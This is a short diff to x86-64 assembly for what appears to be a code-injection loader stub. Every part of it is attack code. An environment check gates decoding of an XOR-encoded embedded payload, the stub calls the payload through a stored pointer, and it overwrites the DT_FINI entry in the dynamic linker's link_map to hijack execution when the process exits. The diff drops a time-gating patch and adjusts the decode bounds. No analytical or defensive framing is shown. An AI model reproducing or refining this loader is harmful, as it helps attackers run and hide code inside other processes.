@@ -1,5 +1,4 @@
 .equ PAYLOAD_SIZE_IN_WORDS, 0
-.equ PAYLOAD_TIME_IMM_OFFSET, 0
 
 .macro movqq a, b
     push \b
@@ -45,9 +44,9 @@ env_check_loop:
 
 env_check_okay:
     // Decode payload
-    movqq rcx, PAYLOAD_SIZE_IN_WORDS
-    // lea rdi, [rbx+(_end-_begin)+24-4] GNU AS outputs 488dba6d000000, why ._.
-    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+24-4
+    movqq rcx, (PAYLOAD_SIZE_IN_WORDS+1)
+    // lea rdi, [rbx+(_end-_begin)+24]
+    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+24
     xor eax, eax
 decode_loop:
     xor [rdi+rcx*4], eax
@@ -61,7 +60,6 @@ decode_loop:
     loop decode_loop
 
     // Patch payload to only run at correct time.
-    lea rdi, [rdi+4+PAYLOAD_TIME_IMM_OFFSET]
     call [rbx-8]
 
     // Overwrite dl_info[DT_FINI] in link_map
